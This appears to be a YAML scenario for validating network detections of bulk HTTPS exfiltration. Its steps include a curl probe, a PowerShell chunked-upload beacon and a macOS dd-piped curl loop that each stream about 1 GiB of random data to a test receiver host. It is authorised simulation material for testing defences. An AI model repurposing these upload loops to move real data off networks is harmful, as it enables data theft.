scenario_id: SIM-NDR-005
name: "NDR — Bulk HTTPS Exfiltration EAL Validation"
version: "1.0"
status: active

plane: NDR
detection_types:
  - XQL
  - BIOC
  - Correlation

uc_ref: UCS-NDR-02
tc_ref: TC-NDR-04
tc_refs:
  - TC-NDR-04
  - TC-DLP-01
pov_scenario_id: POV-SC-008
uc_name: "Network Detection & Response"
tc_name: "Demonstrate behavioral analytics thresholds for malicious egress and data exfil detection"

mitre_tactic: "TA0010"
mitre_tactic_name: "Exfiltration"
mitre_technique: "T1041"
mitre_technique_name: "Exfiltration Over C2 Channel"
additional_techniques:
  - technique: "T1567"
    name: "Exfiltration Over Web Service"

threat_report: "Unit42 - APT Exfiltration via Cloud Storage"
threat_report_url: "https://unit42.paloaltonetworks.com/"

execution_identity:
  default: container-runtime
  options:
    - container-runtime
    - root

push_supported: true
pull_supported: true

# ── Causality Group Owner anchor ────────────────────────────────────────────
# The bulk exfil is streamed from a containerized egress host: the CGO root is
# the container entrypoint (containerd-shim) that owns the shell running the
# receiver reachability check and the chunked-upload beacon — NOT the synthetic
# cortexsim-agent node. Gives XDR a real originating owner for the exfil session.
cgo_anchor:
  image_name: "containerd-shim"
  primary_username: "root"

infra_modules_needed:
  - base
  - ndr

# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
# Rolled out per the S-07 per-plane convention
# (docs/uc_tc_mapping/scenario-methodology-defaults.md). Defaults are not
# fabricated KPIs — they map this plane to the methodology family its
# detection shape already belongs to in the v2.0 master methodology.
validation_methodology: "Network Signal Injection & Detection Accuracy"
methodology_family: "F1"
primary_kpi: "MTTD"
threshold:
  kpi: "MTTD"
  op: "≤"
  value: 300
  unit: "seconds"
success_criteria: |
  The per-protocol egress signal injected by this scenario produces the
  expected NGFW App-ID / XSIAM detection within the MTTD budget. Verifier
  counts matching sessions in dataset=pan_ngfw_traffic and measures
  emit→alert latency.
moat_tier: "LEAD"

external_tools:
  - name: cortexsim-eal-cli
    source: "https://github.com/hankthebldr/cortex-pov-engine"
    type: script
    install_inline: false

steps:
  - id: step-01
    name: "Verify operator-supplied receiver bucket reachable"
    command: |
      curl -sSL -o /dev/null -w '%{http_code}' https://exfil-receiver.testmynids.org/upload || true
    identity: container-runtime
    mitre_technique: "T1567"
    # Root of the causality spine — links from the CGO (containerd-shim).
    platforms: ["linux", "container", "windows"]
    platform_variants:
      # CONT-16: the Windows leg sends only where the operator says. It reads
      # the receiver from CORTEXSIM_EXFIL_URL and refuses without one: the push
      # bundle's preflight reports the step not-executed
      # (OPERATOR_INPUT_MISSING), and on the pull path, which has no preflight,
      # the text itself fails by name before any request is made. For a beacon
      # installed as a service, set it as a machine environment variable and
      # restart the service.
      # What follows from an operator-named receiver: the pre-flight XQL on
      # TTP-2026-0068 filters dst_host = "exfil-receiver.testmynids.org", so
      # substitute your receiver's host when you run it; and the volume BIOC
      # excludes RFC1918 destinations, so the receiver must be one the NGFW
      # sees as external. The probe itself stays non-fatal, like the curl.
      windows: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
        $u = $env:CORTEXSIM_EXFIL_URL
        if ($u -notmatch '^https?://') {
          Write-Error 'cortexsim-ndr-005: CORTEXSIM_EXFIL_URL must name an http(s) upload receiver you control. Nothing was sent.'
          exit 1
        }
        try {
          $r = Invoke-WebRequest -Uri $u -Method Head -UseBasicParsing -TimeoutSec 15
          Write-Host ('cortexsim-ndr-005-receiver-probe status=' + [int]$r.StatusCode)
        } catch {
          Write-Host ('cortexsim-ndr-005-receiver-probe answered: ' + $_.Exception.Message)
        }
    expected_detections:
      - plane: NDR
        type: XQL
        description: "Pre-flight: receiver endpoint resolves / reachable over HTTPS"
        ttp_ref: "TTP-2026-0068"
        detection_id: "xql-pre-flight-bulk-exfil-receiver-reachable-over-https"

  - id: step-02
    name: "Stream 1 GiB random payload across 4 chunked POSTs"
    command: |
      cat > /tmp/bulk-exfil.yml <<'YML'
      campaign_id: CMP-NDR-005
      name: "NDR validation — bulk HTTPS exfil"
      authorized_by: "domain-consultant@paloaltonetworks.com"
      simulation_authorized: true
      target_allowlist:
        - testmynids.org
      dry_run: false
      tags: [ndr, exfil, eal]
      steps:
        - step_id: step-01
          plugin: bulk_https_exfil
          params:
            target_url: https://exfil-receiver.testmynids.org/upload
            total_bytes: 1073741824    # 1 GiB
            chunk_bytes: 4194304       # 4 MiB
            request_count: 4
            method: POST
            request_timeout: 600
      YML
      python3 -m scripts.eal_simulator.cli run /tmp/bulk-exfil.yml --live
    identity: container-runtime
    mitre_technique: "T1041"
    # Same containerized host / session as the receiver reachability check (no
    # fork between the curl probe and the python exfil beacon) → shared_entity.
    causality:
      parent_step: step-01
      pivot: shared_entity
    platforms: ["linux", "container", "windows", "macos"]
    platform_variants:
      # Windows chunked upload: the same volumetric, upload-skewed shape, to the
      # receiver the operator names in CORTEXSIM_EXFIL_URL (CONT-16, see
      # step-01). It used to POST four [byte[]]::new(268435456) arrays of zeros
      # to a hard-coded third-party host: 1 GiB out of a customer network with
      # no operator decision, four 256 MiB allocations in one PowerShell
      # process, and not the random payload the step is named for. It now
      # writes one random 4 MiB buffer 64 times per request, so 4 x 256 MiB
      # reach the wire with 4 MiB held. A request that cannot be sent fails the
      # step. Streaming without buffering is a .NET Framework behaviour
      # (AllowWriteStreamBuffering); it has not been observed on Windows.
      windows: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
        $u = $env:CORTEXSIM_EXFIL_URL
        if ($u -notmatch '^https?://') {
          Write-Error 'cortexsim-ndr-005: CORTEXSIM_EXFIL_URL must name an http(s) upload receiver you control. Nothing was sent.'
          exit 1
        }
        $buf = New-Object byte[] 4194304
        (New-Object System.Random).NextBytes($buf)
        $sent = 0
        foreach ($n in 1..4) {
          try {
            $req = [System.Net.WebRequest]::Create($u)
            $req.Method = 'POST'
            $req.ContentType = 'application/octet-stream'
            $req.ContentLength = 268435456
            $req.AllowWriteStreamBuffering = $false
            $req.Timeout = 600000
            $req.ReadWriteTimeout = 600000
            $s = $req.GetRequestStream()
            foreach ($i in 1..64) { $s.Write($buf, 0, $buf.Length) }
            $s.Close()
            $sent++
            try { $req.GetResponse().Close() }
            catch { Write-Host ('cortexsim-ndr-005 request ' + $n + ' sent; receiver answered: ' + $_.Exception.Message) }
          } catch {
            Write-Error ('cortexsim-ndr-005 request ' + $n + ' failed: ' + $_.Exception.Message)
          }
        }
        Write-Host ('cortexsim-ndr-005-bulk-upload requests_sent=' + $sent + ' of 4 bytes_each=268435456')
        if ($sent -lt 4) { exit 1 }
      # macOS/zsh chunked upload with curl streaming 256 MiB random chunks x4.
      macos: 'for i in $(seq 1 4); do dd if=/dev/urandom bs=1m count=256 2>/dev/null | curl -s -X POST --data-binary @- https://exfil-receiver.testmynids.org/upload; done'
    expected_detections:
      - plane: NDR
        type: BIOC
        description: "NGFW EAL — outbound bytes per session greatly exceeds host baseline"
        ttp_ref: "TTP-2026-0068"
        detection_id: "bioc-ngfw-eal-outbound-bytes-per-session-greatly-exceeds-host-baseline"
      - plane: NDR
        type: BIOC
        description: "NGFW EAL — long-lived, upload-skewed HTTPS session (>2 min duration)"
        ttp_ref: "TTP-2026-0068"
        detection_id: "bioc-ngfw-eal-long-lived-upload-skewed-https-session"
      - plane: ANALYTICS
        type: Correlation
        description: "XSIAM stitching — exfil session-volume anomaly correlated with originating XDR process"
        ttp_ref: "TTP-2026-0068"
        detection_id: "CR-NDR-0008"

cleanup:
  commands:
    - "rm -f /tmp/bulk-exfil.yml"

